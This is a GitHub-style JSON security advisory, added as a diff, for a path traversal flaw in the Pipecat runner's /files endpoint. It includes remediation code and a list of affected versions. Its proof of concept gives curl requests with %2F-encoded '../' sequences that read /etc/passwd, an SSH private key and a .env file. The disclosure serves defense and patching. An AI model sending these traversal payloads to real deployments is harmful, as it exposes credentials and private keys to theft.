@@ -1,0 +1,80 @@
+{
+  "id": "GHSA-3363-2ph6-35wh",
+  "modified": "2026-05-15T17:05:12.628738Z",
+  "published": "2026-05-15T16:55:04Z",
+  "aliases": [
+    "CVE-2026-44716"
+  ],
+  "summary": "Pipecat: Path Traversal in Pipecat Runner `/files` Endpoint — Arbitrary File Read via `%2F`-Encoded Separator",
+  "details": "## Summary\n\nA path traversal vulnerability exists in Pipecat's development runner (`src/pipecat/runner/run.py`). When the runner is started with the `--folder` flag, it exposes a `GET /files/{filename:path}` download endpoint. The `filename` path parameter is concatenated directly onto `args.folder` with no containment check. Starlette normalises literal `../` sequences in URLs, but `%2F`-encoded slashes bypass this normalisation: the path parameter is URL-decoded *after* routing, so `..%2F..%2Fetc%2Fpasswd` resolves to a path two levels above `args.folder`. An attacker with network access to the runner can read any file the pipecat process has permission to access — including SSH private keys, credentials, and system files — with a single unauthenticated HTTP request.\n\nConfirmed on **pipecat-ai 1.1.0** (latest PyPI release) and commit `f078df78058ae82a02ce5b23e9e3a99a0917a53d`.\n\n---\n\n## Details\n\nThe vulnerable code is in `src/pipecat/runner/run.py`, inside the `_configure_server_app()` function, lines 249–264:\n\n```python\n@app.get(\"/files/{filename:path}\")\nasync def download_file(filename: str):\n    \"\"\"Handle file downloads.\"\"\"\n    if not args.folder:\n        logger.warning(f\"Attempting to dowload {filename}, but downloads folder not setup.\")\n        return\n\n    file_path = Path(args.folder) / filename          # ← no containment check\n    if not os.path.exists(file_path):\n        raise HTTPException(404)\n\n    media_type, _ = mimetypes.guess_type(file_path)\n\n    return FileResponse(path=file_path, media_type=media_type, filename=filename)\n```\n\n`Path(args.folder) / filename` joins the caller-supplied `filename` onto the base directory without calling `.resolve()` or checking `is_relative_to`. Python's `pathlib` does not strip `..` segments during join — only `.resolve()` does. Starlette strips literal `../` from the *URL path* before the route handler runs, but it decodes percent-encoded characters *inside* the matched path parameter value. Because `%2F` decodes to `/` after the router has already matched the route, the value that reaches `filename` can contain `/` characters, enabling directory traversal.\n\nFor example:\n\n```\nGET /files/..%2F..%2Fetc%2Fpasswd\n                   ↓\nfilename = \"../../etc/passwd\"          (after Starlette decodes %2F)\nfile_path = Path(\"/tmp/media\") / \"../../etc/passwd\"\n          = Path(\"/tmp/media/../../etc/passwd\")\n          → resolves to /etc/passwd    (os.path.exists returns True)\n```\n\nThe endpoint has no authentication — the runner does not implement any auth layer — so the request requires no credentials.\n\n---\n\n## Proof of Concept\n\n### Step 1 — Start the Pipecat runner with `--folder`\n\nThe runner requires a bot script with a `bot()` entry point. A minimal script that keeps the HTTP server alive without any transport logic:\n\n```python\n# minimal_bot.py\nasync def bot(runner_args):\n    import asyncio\n    await asyncio.sleep(86400)\n\nif __name__ == \"__main__\":\n    from pipecat.runner.run import main\n    main()\n```\n\nStart the runner:\n\n```bash\npip install \"pipecat-ai[runner,webrtc]\"\n\nmkdir /tmp/bot_media\necho \"session transcript\" \u003e /tmp/bot_media/recording.txt\n\npython minimal_bot.py \\\n    -t webrtc \\\n    --host 127.0.0.1 \\\n    --port 7860 \\\n    --folder /tmp/bot_media\n```\n\nExpected output:\n\u003cimg width=\"1626\" height=\"462\" alt=\"image\" src=\"https://github.com/user-attachments/assets/912e8ea2-cff9-4a36-a6be-e85091d9f89f\" /\u003e\n\n### Step 2 — Exploit\n\n```bash\n# Legitimate request — serves a file inside --folder\ncurl \"http://127.0.0.1:7860/files/recording.txt\"\n# → session transcript\n\n# Literal ../ — blocked by Starlette path normalisation\ncurl \"http://127.0.0.1:7860/files/../../etc/passwd\"\n# → {\"detail\":\"Not Found\"}\n\n# %2F-encoded separators — bypass normalisation, read /etc/passwd\ncurl \"http://127.0.0.1:7860/files/..%2F..%2Fetc%2Fpasswd\"\n# → ## User Database\n#   root:*:0:0:System Administrator:/var/root:/bin/sh\n#   ...\n\n# Read SSH private key\ncurl \"http://127.0.0.1:7860/files/..%2F..%2F..%2Fhome%2Fuser%2F.ssh%2Fid_rsa\"\n# → -----BEGIN OPENSSH PRIVATE KEY-----\n#   b3BlbnNzaC1rZXktdjEAAAA...\n\n# Read application secrets\ncurl \"http://127.0.0.1:7860/files/..%2F..%2F.env\"\n```\n\n### Confirmed results (pipecat-ai 1.1.0, tested 2026-04-29)\n\n| Request | HTTP status | Content |\n|---------|-------------|---------|\n| `GET /files/recording.txt` | 200 | Legitimate file |\n| `GET /files/../../etc/passwd` | 404 | Blocked — literal `..` normalised away |\n| `GET /files/..%2F..%2Fetc%2Fpasswd` | **200** | Full `/etc/passwd` |\n| `GET /files/..%2F..%2F..%2Fhome/…/.ssh/id_rsa` | **200** | RSA private key (`BEGIN OPENSSH PRIVATE KEY`) |\n\u003cimg width=\"2222\" height=\"516\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4c7a014c-8646-479a-8439-b8e722a69e49\" /\u003e\n\u003cimg width=\"1304\" height=\"314\" alt=\"image\" src=\"https://github.com/user-attachments/assets/14f71b3f-2a35-4d2b-8049-8af758fbc6ba\" /\u003e\n\u003cimg width=\"1188\" height=\"390\" alt=\"image\" src=\"https://github.com/user-attachments/assets/53fe2b33-2cd3-4745-b9f2-7aa426318e00\" /\u003e\n\n---\n\n## Impact\n\nThe `--folder` flag is a documented, first-class feature of the runner: the `runner_downloads_folder()` helper and `-f / --folder` CLI argument are part of the public API. The runner documentation includes LAN-deployment examples (`--host 192.168.1.100` for ESP32 integration). In those deployments, any host on the local network can exploit this with zero credentials.\n\nAn attacker who can reach the runner port and knows `--folder` is active can retrieve any file readable by the pipecat process:\n\n- SSH private keys and TLS certificates\n- `.env` files and application credentials\n- Database files, session tokens, API keys\n- System files such as `/etc/passwd` and `/etc/shadow` (on Linux)\n- Source code, config files, and secrets in parent directories of `--folder`\n\n---\n\n## Remediation\n\nCall `.resolve()` on both the base path and the joined path, then assert containment with `is_relative_to`:\n\n```python\n@app.get(\"/files/{filename:path}\")\nasync def download_file(filename: str):\n    if not args.folder:\n        logger.warning(f\"Attempting to dowload {filename}, but downloads folder not setup.\")\n        return\n\n    allowed_base = Path(args.folder).resolve()\n    file_path = (allowed_base / filename).resolve()   # resolve AFTER join\n\n    if not file_path.is_relative_to(allowed_base):    # containment check\n        raise HTTPException(status_code=403, detail=\"Access denied\")\n    if not file_path.exists():\n        raise HTTPException(status_code=404)\n\n    media_type, _ = mimetypes.guess_type(file_path)\n    return FileResponse(path=file_path, media_type=media_type, filename=file_path.name)\n```\n\n`Path.resolve()` expands all `..` components and follows symlinks before `is_relative_to` compares the paths, so neither `%2F`-encoded separators nor symlink chains can escape the allowed base.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pipecat-ai",
+        "purl": "pkg:pypi/pipecat-ai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.0.90"
+            },
+            {
+              "fixed": "1.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.100",
+        "0.0.101",
+        "0.0.102",
+        "0.0.103",
+        "0.0.104",
+        "0.0.105",
+        "0.0.106",
+        "0.0.107",
+        "0.0.108",
+        "0.0.90",
+        "0.0.91",
+        "0.0.92",
+        "0.0.93",
+        "0.0.94",
+        "0.0.95",
+        "0.0.96",
+        "0.0.97",
+        "0.0.98",
+        "0.0.99",
+        "1.0.0",
+        "1.1.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-3363-2ph6-35wh/GHSA-3363-2ph6-35wh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-3363-2ph6-35wh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/pull/4417"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/commit/7519c26ac5508573c35fa3a9c4717b013993d129"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pipecat-ai/pipecat"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pipecat-ai/pipecat/releases/tag/v1.2.0"
+    }
+  ]
+}
